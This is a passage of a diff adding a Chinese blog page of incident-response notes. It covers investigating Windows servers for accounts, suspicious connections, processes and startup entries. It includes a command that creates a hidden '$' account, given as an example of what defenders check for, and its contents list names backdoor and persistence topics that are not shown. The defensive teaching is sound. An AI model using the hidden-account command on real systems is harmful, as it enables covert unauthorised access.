@@ -1,0 +1,4645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Safe: 11-应急响应</title>
+<meta name="description" content="kubernetes, linux" />
+<meta name="keywords" content="kubernetes, linux" />
+<meta name="generator" content="Org Mode" />
+<script>
+/* main.css 默认把 body 隐藏起来，为的是切换深色模式时不闪白。
+   恢复可见完全交给 CSS 的 html.js:not(.ready) 选择器控制：
+   - 没有 JS：下面这句不会执行，html 上没有 .js，body 一开始就是可见的
+   - 有 JS 但 main.js 加载失败或抛异常：load 事件（或 2 秒兜底）照样会加上 .ready
+   任何一条路径都不会留下白屏。 */
+(function () {
+  var el = document.documentElement;
+  el.className += ' js';
+  function reveal() { el.className += ' ready'; }
+  window.addEventListener('load', reveal);
+  setTimeout(reveal, 2000);
+})();
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<link rel="alternate" type="application/rss+xml" title="Jasper Hsu's Blog" href="https://xuchangwei.com/rss.xml">
+<link rel="me" href="https://emacs.ch/@jasperhsu">
+<meta name="google-adsense-account" content="ca-pub-1741779893655624">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
+<!-- from -->
+<!--
+<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
+-->
+<link rel="stylesheet" href="/static/distro-htmlize.css">
+<link rel="stylesheet" href="/static/aandds.com/css/main.css">
+<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
+<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '85%'
+      },
+      tags: 'ams',
+      tagSide: 'right',
+      tagIndent: '.8em'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    output: {
+      font: 'mathjax-modern',
+      displayOverflow: 'overflow'
+    }
+  };
+</script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">Safe: 11-应急响应</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>&#30446;&#24405;</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">入侵排查</a>
+<ul>
+<li><a href="#h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">Windows入侵排查</a>
+<ul>
+<li><a href="#h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">检查系统账号安全</a></li>
+<li><a href="#h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">检查异常端口、进程</a></li>
+<li><a href="#h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">检查启动项、计划任务、服务</a></li>
+</ul>
+</li>
+<li><a href="#h:44523998-1c58-49c0-9428-26688ff69212">Linux入侵排查</a>
+<ul>
+<li><a href="#h:ac41c858-0a1f-4308-8234-d005472fd39e">账号安全</a></li>
+<li><a href="#h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">历史命令</a></li>
+<li><a href="#h:9fb560c0-8826-4fa6-b694-6e6670b17165">检查异常端口</a></li>
+<li><a href="#h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">检查异常进程</a></li>
+<li><a href="#h:ac57c193-f535-4878-9aa4-45de3d31cb19">检查开机启动项</a></li>
+<li><a href="#h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">检查定时任务</a></li>
+<li><a href="#h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">检查服务</a></li>
+<li><a href="#h:aad1612a-570d-4784-ae87-e9a897040b0c">检查异常文件</a></li>
+<li><a href="#h:7a6ff2be-e8c2-4f04-be72-45b597199d35">检查系统日志</a></li>
+<li><a href="#h:6401c5d1-dfce-44a3-bce9-018909aaa639">工具查杀</a>
+<ul>
+<li><a href="#h:20ab8570-f66a-40ff-aeed-2fe75bab1537">Rootkit查杀</a></li>
+<li><a href="#h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">病毒查杀</a></li>
+<li><a href="#h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">Webshell查杀</a></li>
+</ul>
+</li>
+<li><a href="#h:515b7fac-1aea-487e-99fb-39fa5ec07c29">常见的WebShell查杀工具</a></li>
+</ul>
+</li>
+<li><a href="#h:bef7aac0-add2-483b-95dd-458ed18abf1f">如何发现隐藏的WebShell后门</a>
+<ul>
+<li><a href="#h:e6afe316-bfc8-4104-bd44-620dce8dc173">MD5校验</a></li>
+<li><a href="#h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">diff 命令</a></li>
+<li><a href="#h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">文件对比工具</a></li>
+</ul>
+</li>
+<li><a href="#h:f785651d-4c48-4940-8edc-035dd5e57059">勒索病毒自救指南</a>
+<ul>
+<li><a href="#h:26cb4d10-921a-4d32-bd8d-eacb5892f671">勒索病毒加密原理</a></li>
+<li><a href="#h:85408cb0-64ca-4c57-977a-3672675d5ffa">勒索病毒搜索引擎</a></li>
+<li><a href="#h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">勒索软件解密工具集</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:c26653c9-8354-4a48-b1aa-5154167bcb3a">日志分析</a>
+<ul>
+<li><a href="#h:c630603c-65f4-4635-b0a6-ed004a034cd5">Windows日志分析</a>
+<ul>
+<li><a href="#h:84bcb036-c79c-464d-986c-1971f5175d94">Windows事件日志简介</a></li>
+<li><a href="#h:501e691b-deb4-4a5c-9908-e2353893bed7">审核策略与事件查看器</a></li>
+<li><a href="#h:d84fa5fc-07c9-4ac3-82be-916dde99148a">事件日志分析</a></li>
+<li><a href="#h:1082091b-d219-4164-beed-333c51aa58dc">日志分析工具</a>
+<ul>
+<li><a href="#h:96ad6e3b-e163-4d5e-84e8-542eda403c90">Log Parser</a></li>
+<li><a href="#h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">LogParser Lizard</a></li>
+</ul>
+</li>
+<li><a href="#h:30d1ca31-a688-453a-bded-78a4bd92d239">充内容</a></li>
+</ul>
+</li>
+<li><a href="#h:76b03265-0d66-46bf-8179-5b57aaad24fc">Linux日志分析</a>
+<ul>
+<li><a href="#h:1078246b-c584-46c4-877b-b70783565d45">日志简介</a></li>
+<li><a href="#h:e1cd4961-0b47-4a15-a250-0c8172c74a46">日志分析技巧</a>
+<ul>
+<li><a href="#h:64e781d4-dccd-4720-82ed-78a3723aa0f4">常用的shell命令</a></li>
+<li><a href="#h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">日志分析技巧</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:0f71492b-b173-4475-8bdf-550a089b5a07">Web日志分析</a>
+<ul>
+<li><a href="#h:7aa654f6-bc7f-4031-85a5-028c11571ea4">日志分析技巧</a></li>
+<li><a href="#h:af9f46d6-c15d-465d-a977-14dfbc86d5db">日志分析案例</a></li>
+<li><a href="#h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">日志统计分析技巧</a></li>
+</ul>
+</li>
+<li><a href="#h:9401981a-7cf6-458a-b060-bfe7149ffbf3">Mysql日志分析</a>
+<ul>
+<li><a href="#h:f08aa3df-2ea7-4824-87d1-079af315485a">Mysql暴力破解日志分析</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:1aec45e7-2501-4277-b22a-20c41fa36fe1">权限维持</a>
+<ul>
+<li><a href="#h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">Windows权限维持-隐藏篇</a>
+<ul>
+<li><a href="#h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">隐藏文件</a>
+<ul>
+<li><a href="#h:154fb59a-f437-4db8-8ad8-4ec807786e0b">方法1-利用文件属性</a></li>
+<li><a href="#h:6c33a506-482b-422a-a9e7-297387ac4554">方法2-利用ADS(Alternate Data Streams)隐藏文件内容</a></li>
+</ul>
+</li>
+<li><a href="#h:409b7b71-a25c-428b-b265-1bfee181c342">隐藏账号</a></li>
+<li><a href="#h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">进程注入</a></li>
+</ul>
+</li>
+<li><a href="#h:a10c8441-9e1b-4801-a3ec-a2194ed60390">Windows权限维持-后门篇</a>
+<ul>
+<li><a href="#h:937417c7-af8b-450d-9f5b-784f1306db54">粘滞键后门</a></li>
+<li><a href="#h:efb03ca1-5a14-426a-bd28-0acab9780c9f">Logon Scripts后门</a></li>
+<li><a href="#h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">映像劫持</a></li>
+<li><a href="#h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">注册表自启动后门</a></li>
+<li><a href="#h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">计划任务后门</a></li>
+<li><a href="#h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">服务自启动后门</a></li>
+</ul>
+</li>
+<li><a href="#h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">Linux权限维持-隐藏篇</a>
+<ul>
+<li><a href="#h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">隐藏文件</a></li>
+<li><a href="#h:87e115d3-9cd8-430b-a0db-aec09e79f61e">隐藏文件时间戳</a></li>
+<li><a href="#h:4beedc56-2f95-4ce4-8147-00b6726cca9c">隐藏权限</a></li>
+<li><a href="#h:a388aa4a-f3b5-4044-849c-3b412c075e9d">隐藏历史操作命令</a></li>
+</ul>
+</li>
+<li><a href="#h:700f5d3c-290f-452f-90e8-e2055a96cdd9">Linux权限维持-后门篇</a>
+<ul>
+<li><a href="#h:a7913564-0810-46e7-9577-b4c9a0f96db6">一句话添加用户和密码</a></li>
+<li><a href="#h:408294ae-7613-4498-82d2-f6322b12a9ae">SSH免密登录</a></li>
+</ul>
+</li>
+<li><a href="#h:44407d4b-cafe-4c37-abb2-015f359766fe">Windows命令行文件下载方式汇总</a>
+<ul>
+<li><a href="#h:ab2f6774-fca7-4761-9c74-de76620d5b4f">PowerShell</a></li>
+<li><a href="#h:e0d3e37a-6e4e-4b23-af50-86283f941a20">Bitsadmin</a></li>
+<li><a href="#h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">certutil</a></li>
+<li><a href="#h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">msiexec</a></li>
+<li><a href="#h:31a4d5cd-9513-4200-b80a-802754bd7849">mshta</a></li>
+</ul>
+</li>
+<li><a href="#h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">渗透测试框架权限维持技术</a>
+<ul>
+<li><a href="#h:4315d3f2-4cb0-426e-a7f4-c6942d761779">Persistence模块</a></li>
+</ul>
+</li>
+<li><a href="#h:094b5985-c8f5-4291-a93a-06a33a248be2">常见Webshell管理工具</a>
+<ul>
+<li><a href="#h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">菜刀</a></li>
+<li><a href="#h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">蚁剑</a></li>
+<li><a href="#h:c2a5d40f-3e49-478e-ad2b-c38075584820">冰蝎</a></li>
+<li><a href="#h:336be93e-5b56-4497-9dde-f92d4f9be35c">哥斯拉</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:a37c3f0c-da61-446b-a906-01ee5e3ca183">Windows 实战</a>
+<ul>
+<li><a href="#h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">FTP暴力破解</a></li>
+<li><a href="#h:380cb457-03cf-4b88-86f0-bcf17077542f">勒索病毒</a></li>
+<li><a href="#h:606725a8-8982-4693-ac45-a6a116b98cf2">挖矿病毒</a></li>
+</ul>
+</li>
+<li><a href="#h:c1741471-1dc6-42cc-9e32-9db2318148be">Linux 实战</a>
+<ul>
+<li><a href="#h:8c07cd81-c67c-4f47-b602-0575e35a8385">SSH暴力破解</a></li>
+<li><a href="#h:db79cc82-db3f-40da-9805-1c94bd82a73c">DDOS病毒</a></li>
+</ul>
+</li>
+<li><a href="#h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">Web 实战</a>
+<ul>
+<li><a href="#h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">网站被植入Webshell</a></li>
+<li><a href="#h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">批量挂黑页</a></li>
+<li><a href="#h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">新闻源网站劫持</a></li>
+<li><a href="#h:98272edc-c33e-4bcd-983c-c11c06aece65">搜索引擎劫持</a></li>
+<li><a href="#h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">网站首页被篡改</a></li>
+<li><a href="#h:02bdb174-5393-4e67-8a8c-4c12cf841e13">管理员账号被篡改</a></li>
+<li><a href="#h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">编辑器入侵事件</a></li>
+</ul>
+</li>
+<li><a href="#h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">撰写应急响应报告</a></li>
+</ul>
+</div>
+</nav>
+<ul class="org-ul">
+<li>TAGS: <a href="../index.html">Safe</a></li>
+</ul>
+<section id="outline-container-h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897" class="outline-2">
+<h2 id="h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897"><a href="#h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">入侵排查</a></h2>
+<div class="outline-text-2" id="text-h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">
+<ul class="org-ul">
+<li>在护网中，对流量、告警分析，属于初级安全工程师的工作</li>
+<li>中级安全工程师，对于告警发现攻击事件，并定位到入侵方法和路径，有针对的进行防护（应急响应）</li>
+</ul>
+
+
+<p>
+当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。
+</p>
+<ul class="org-ul">
+<li>收到应急响应通知，首先确定是否是安全事件。</li>
+</ul>
+
+<p>
+常见的应急响应事件分类：
+</p>
+<ul class="org-ul">
+<li>Web入侵：网页挂马、主页篡改、Webshell</li>
+<li>系统入侵：病毒木马、勒索软件、远控后门</li>
+<li>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</li>
+</ul>
+
+<p>
+说明如下
+</p>
+
+<p>
+Web入侵：
+</p>
+<ul class="org-ul">
+<li>网页挂马: 网页上被挂了一些木马</li>
+<li>主页篡改：主要用于一些社会层面或者国家层面的攻击。比如重要会议期间攻击一些政府网站，在网站发布反动言论。防护手段，网站上云监控，通过脚本抓取网站所有链接分析，网站发生异常变化时运维人员就会收到短信通知</li>
+<li>Webshell：SQL注入、文件上传等都可以实现webshell</li>
+</ul>
+
+<p>
+系统入侵：
+</p>
+<ul class="org-ul">
+<li>系统入侵主要借助一些自动化的工具分析相关的进程，查找出恶意文件然后进行删除。</li>
+</ul>
+
+<p>
+网络攻击：
+</p>
+<ul class="org-ul">
+<li>DDOS 攻击： 防御，部署流量清洗设备、抗D设备、CDN做流量分流。</li>
+<li>DNS 劫持：攻击者利用攻击手段篡改了某个域名的解析结果，使得指向该域名的ip变成也另一个ip，导致相应网站的访问被劫持到另一个假冒的站点，从而实现非法窃取用户信息、破坏网络服务的目的</li>
+<li>ARP 欺骗：arp是一个地址解析协议，在局域网里主机间通信发送arp应答信息，本地主机收到应答信息后不会验证真实性，会把信息记录在自己的映射表里，这样就会有一个ip和mac对应关系。攻击者利用这种机制发送一些伪造的arp包，篡改了目标主机的arp缓存表，造成主机间无法正常通信。</li>
+</ul>
+
+<p>
+网络攻击在处理上相对于web入侵和系统入侵来说处理难度较高。因为他们不属于常规的攻击，如果攻击者真的用这种方法来打你，它肯定是一种伤敌1000自损800的做法。
+</p>
+</div>
+<div id="outline-container-h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f" class="outline-3">
+<h3 id="h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f"><a href="#h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">Windows入侵排查</a></h3>
+<div class="outline-text-3" id="text-h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">
+<p>
+<b>使用环境：Windows Server 2008</b>
+</p>
+
+<p>
+针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，常见 Windows 服务器入侵排查的思路如下。
+</p>
+</div>
+<div id="outline-container-h:aac5153b-992e-45bc-a5eb-b7a15675a6f2" class="outline-4">
+<h4 id="h:aac5153b-992e-45bc-a5eb-b7a15675a6f2"><a href="#h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">检查系统账号安全</a></h4>
+<div class="outline-text-4" id="text-h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">
+<p>
+<b>1、查看服务器是否有弱口令，远程管理端口是否对公网开放</b>
+</p>
+
+<p>
+检查方法：据实际情况咨询相关服务器管理员。
+</p>
+
+<p>
+<b>2、查看服务器是否存在可疑账号、新增账号</b>
+</p>
+
+<p>
+检查方法：打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，请立即禁用或删除。
+</p>
+
+<p>
+名称后面有$符号是隐藏账号。使用 net user 命令是看不到隐藏账号的。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#28155;&#21152;&#38544;&#34255;&#36134;&#21495;
+</span>net user /add test$
+
+net user
+</pre>
+</div>
+
+
+<figure id="org266b0e6">
+<img style="aspect-ratio:1602/514" decoding="async" loading="lazy" src="./images/img_20230814_112848.webp" alt="img_20230814_112848.webp" width="50%">
+
+</figure>
+
+<p>
+发现可疑test账号，删除test账号
+</p>
+
+
+<figure id="org1259922">
+<img style="aspect-ratio:1560/830" decoding="async" loading="lazy" src="./images/img_20230814_112908.webp" alt="img_20230814_112908.webp" width="50%">
+
+</figure>
+
+<p>
+<b>3、查看服务器是否存在隐藏账号、克隆账号</b>
+</p>
+
+<p>
+检查方法：使用D盾_web查杀工具，集成了对隐藏、克隆账号检测的功能
+</p>
+
+
+
+<figure id="org7704e6d">
+<img style="aspect-ratio:1588/566" decoding="async" loading="lazy" src="./images/img_20230814_113003.webp" alt="img_20230814_113003.webp" width="50%">
+
+</figure>
+
+
+<p>
+<b>4、结合日志，查看管理员登录时间、用户名是否存在异常</b>
+</p>
+
+<p>
+检查方法：
+</p>
+
+<p>
+a、Win+R 打开运行，输入"eventvwr.msc"，回车运行，打开“事件查看器”。
+</p>
+
+
+<figure id="org93109dd">
+<img style="aspect-ratio:1002/1428" decoding="async" loading="lazy" src="./images/img_20230814_113132.webp" alt="img_20230814_113132.webp" width="50%">
+
+</figure>
+
+<p>
+b、导出 Windows 日志 &#x2013; 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。
+</p>
+
+
+<figure id="org6a76ae6">
+<img style="aspect-ratio:1576/930" decoding="async" loading="lazy" src="./images/img_20230814_113237.webp" alt="img_20230814_113237.webp" width="50%">
+
+</figure>
+
+<p>
+工具下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a>
+</p>
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">LogParser.exe -i:&#36755;&#20837;&#25991;&#20214;&#30340;&#26684;&#24335; SQL&#35821;&#21477; -o&#65306;&#36755;&#20986;&#25991;&#20214;&#30340;&#26684;&#24335;
+</span>LogParser.exe -i:evt <span class="org-string">"select top 100 * from D:\&#31163;&#32447;&#24037;&#20855;\Security.evtx "</span> - o:DATAGRID
+
+&#21442;&#25968;&#20351;&#29992;
+-i:&lt;&#36755;&#20837;&#28304;&gt;
+&#20013;&#38388;&#37096;&#20998;&#65292;sql&#35821;&#21477;
+-o:&lt;&#36755;&#20986;&#26684;&#24335;&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9" class="outline-4">
+<h4 id="h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9"><a href="#h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">检查异常端口、进程</a></h4>
+<div class="outline-text-4" id="text-h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">
+<p>
+<b>1、检查网络连接情况，是否有远程连接、可疑连接</b>
+</p>
+
+<p>
+检查方法：
+</p>
+
+<p>
+a、使用 netstat -ano 命令查看目前的网络连接，定位可疑的 ESTABLISHED
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">ESTABLISHED <span class="org-comment-delimiter">#</span><span class="org-comment">&#23436;&#25104;&#36830;&#25509;&#24182;&#27491;&#22312;&#36827;&#34892;&#25968;&#25454;&#36890;&#20449;&#30340;&#29366;&#24577;&#12290;
+</span>LISTENING   <span class="org-comment-delimiter">#</span><span class="org-comment">&#34920;&#31034;&#22788;&#20110;&#20390;&#21548;&#29366;&#24577;&#65292;&#23601;&#26159;&#35828;&#35813;&#31471;&#21475;&#26159;&#24320;&#25918;&#30340;&#65292;&#31561;&#24453;&#36830;&#25509;&#65292;&#20294;&#36824;&#27809;&#26377;&#34987;&#36830;&#25509;&#12290;
+</span>CLOSE_WAIT  <span class="org-comment-delimiter">#</span><span class="org-comment">&#23545;&#26041;&#20027;&#21160;&#20851;&#38381;&#36830;&#25509;&#25110;&#32773;&#32593;&#32476;&#24322;&#24120;&#23548;&#33268;&#36830;&#25509;&#20013;&#26029;&#12290;
+</span>TIME_WAIT   <span class="org-comment-delimiter">#</span><span class="org-comment">&#25105;&#26041;&#20027;&#21160;&#35843;&#29992;close()&#26029;&#24320;&#36830;&#25509;&#65292;&#25910;&#21040;&#23545;&#26041;&#30830;&#35748;&#21518;&#29366;&#24577;&#21464;&#20026;TIME_WAIT&#12290;</span>
+</pre>
+</div>
+
+<p>
+b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">tasklist | findstr <span class="org-string">"PID&#32534;&#21495;"</span>
+
+netstat -ano | find <span class="org-string">"ESTABLISHED"</span>
+tasklist | findstr <span class="org-string">"8284"</span>
+</pre>
+</div>
+
+
+<figure id="orga6fb496">
+<img style="aspect-ratio:1596/274" decoding="async" loading="lazy" src="./images/img_20230814_134805.webp" alt="img_20230814_134805.webp" width="50%">
+
+</figure>
+
+
+<p>
+可以进一步去任务管理器的服务选项中确认（不一定能找到，因为webshell是依赖web服务运行的，能找到web服务，webshell不是一个单独运行的服务）
+</p>
+<ul class="org-ul">
+<li>状态栏鼠标右键选择任务管理器</li>
+</ul>
+
+
+<figure id="orgdac5516">
+<img style="aspect-ratio:1088/1112" decoding="async" loading="lazy" src="./images/img_20230814_134338.webp" alt="img_20230814_134338.webp" width="50%">
+
+</figure>
+
+<p>
+<b>2、进程</b>
+</p>
+
+<p>
+检查方法：依据进程名称查看是否有可疑进程，比如6666.exe可能是木马。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">tasklist /svc
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-sh">C:\Users\jasper&gt;tasklist /svc
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+Registry                       136 N/A
+</pre>
+</div>
+
+
+<figure id="org7c9094c">
+<img style="aspect-ratio:1596/196" decoding="async" loading="lazy" src="./images/img_20230814_134844.webp" alt="img_20230814_134844.webp" width="50%">
+
+</figure>
+
+<p>
+a、开始 &#x2013; 运行 &#x2013; 输入 msinfo32 命令，依次点击 "软件环境 &#x2013; 正在运行任务" 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。
+</p>
+<ul class="org-ul">
+<li>排查方法：关注版本为不可用的服务</li>
+</ul>
+
+
+<figure id="org9a1c15e">
+<img style="aspect-ratio:1574/796" decoding="async" loading="lazy" src="./images/img_20230814_134917.webp" alt="img_20230814_134917.webp" width="50%">
+
+</figure>
+
+<p>
+b、打开D盾_web查杀工具，进程查看，关注没有可疑信息的进程
+</p>
+
+
+<figure id="org23e97a2">
+<img style="aspect-ratio:1572/1088" decoding="async" loading="lazy" src="./images/img_20230814_135538.webp" alt="img_20230814_135538.webp" width="50%">
+
+</figure>
+
+<p>
+c、通过微软官方提供的 Process Explorer 等工具进行排查
+</p>
+
+<p>
+工具下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a>
+</p>
+
+<p>
+使用
+</p>
+<ul class="org-ul">
+<li>查看进程属性：右键属性&#x2013;&gt;安全</li>
+<li>查看进程调用哪些DLL文件： 选择进程，菜单栏View&#x2013;&gt;Lower Pane View &#x2013;&gt; DLLs</li>
+<li>查看进程事件句柄： 选择进程，菜单栏View&#x2013;&gt;Lower Pane View &#x2013;&gt; Handlers</li>
+</ul>
+
+
+<figure id="orgb36fae8">
+<img style="aspect-ratio:1568/946" decoding="async" loading="lazy" src="./images/img_20230814_135603.webp" alt="img_20230814_135603.webp" width="50%">
+
+</figure>
+
+<p>
+d、查看可疑的进程及其子进程
+</p>
+
+<p>
+可以通过观察以下内容
+</p>
+<ul class="org-ul">
+<li>没有签名验证信息的进程</li>
+<li>没有描述信息的进程</li>
+<li>进程的属主</li>
+<li>进程的路径是否合法</li>
+<li>CPU或内存资源占用长时间过高的进程（比如挖矿）</li>
+</ul>
+
+<p>
+常用命令：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">1&#26597;&#30475;&#31471;&#21475;&#23545;&#24212;&#30340; PID
+</span>netstat -ano | findstr <span class="org-string">"port"</span>
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">2&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340; PID&#65306;
+</span>&#20219;&#21153;&#31649;&#29702;&#22120; -- &#26597;&#30475; -- &#36873;&#25321;&#21015; -- PID &#25110;&#32773; tasklist | findstr <span class="org-string">"PID"</span>
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">3&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340;&#31243;&#24207;&#20301;&#32622;&#65306;
+</span>   &#20219;&#21153;&#31649;&#29702;&#22120; -- &#36873;&#25321;&#23545;&#24212;&#36827;&#31243; -- &#21491;&#38190;&#25171;&#24320;&#25991;&#20214;&#20301;&#32622;
+   &#36816;&#34892;&#36755;&#20837;wmic&#65292;cmd &#30028;&#38754;&#36755;&#20837; process
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">4&#26597;&#30475;&#36827;&#31243;&#26381;&#21153;
+</span>tasklist /svc <span class="org-comment-delimiter">#</span><span class="org-comment">&#36827;&#31243; -- PID -- &#26381;&#21153;
+</span>
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#26597;&#30475;Windows&#26381;&#21153;&#25152;&#23545;&#24212;&#30340;&#31471;&#21475;&#65306;
+</span>%systemroot%/system32/drivers/etc/services&#65288;&#19968;&#33324; %systemroot% &#23601;&#26159; C:\Windows &#36335; &#24452;&#65289;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f" class="outline-4">
+<h4 id="h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f"><a href="#h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">检查启动项、计划任务、服务</a></h4>
+<div class="outline-text-4" id="text-h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">
+<p>
+<b>检查服务器是否有异常的启动项</b>
+</p>
+
+<p>
+检查方法：
+</p>
+<ol class="org-ol">
+<li>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</li>
+
+<li>单击开始菜单 &gt;【运行】，输入 msconfig ，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</li>
+
+<li><p>
+单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
+</pre>
+</div>
+
+<p>
